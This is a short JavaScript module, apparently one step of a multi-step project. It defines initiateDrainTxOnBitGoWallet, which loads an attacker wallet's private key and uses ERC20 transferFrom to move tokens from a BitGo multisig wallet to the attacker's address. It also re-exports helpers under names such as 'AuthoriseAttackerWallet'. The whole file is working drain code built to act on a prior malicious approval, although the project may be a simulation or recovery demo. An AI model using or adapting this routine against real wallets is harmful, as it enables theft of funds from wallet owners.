import ERC20ABI from "../Step-2-Setting-up-Compensation-For-Gas/ERC20ABI.json" assert { type: "json" };
import {
  getWeb3Object,
  getGasPriceEstimate,
} from "../Step-2-Setting-up-Compensation-For-Gas/helper.js";
import { logMessage, LOG_LEVELS } from "../common/helper.js";

export {
  getApproveFailSafeOrchestratorTransactionDataField as getApproveERC20AssetTransactionDataField,
  getParamsForSendMultiSigFunction,
  sendMultiSigTransactionToAuthoriseFailSafeOrchestrator as sendMultiSigTransactionToAuthoriseAttackerWallet,
  getNextSequenceId,
} from "../Step-2-Setting-up-Compensation-For-Gas/helper.js";

export async function initiateDrainTxOnBitGoWallet(
  attackerWalletAddress,
  attackerWalletAddressPrivateKey,
  bitGoWalletAddress,
  erc20TokenAddress,
  chainId,
  amount
) {
  try {
    const web3 = await getWeb3Object(chainId);
    web3.eth.accounts.wallet.add(attackerWalletAddressPrivateKey);

    const ERC20Contract = new web3.eth.Contract(ERC20ABI, erc20TokenAddress);
    const transferAmountBN = web3.utils.toBN(amount);

    const gasPriceEstimate = await getGasPriceEstimate(web3);

    const drainTx = await ERC20Contract.methods
      .transferFrom(bitGoWalletAddress, attackerWalletAddress, transferAmountBN)
      .send({
        gas: 400000, // Cap at 400k gas units
        from: attackerWalletAddress,
        gasPrice: gasPriceEstimate,
      });

    logMessage(
      LOG_LEVELS.DEBUG,
      "Drain transaction response: " + JSON.stringify(drainTx, null, 2)
    );
  } catch (error) {
    console.error(error);
    return null;
  }
}
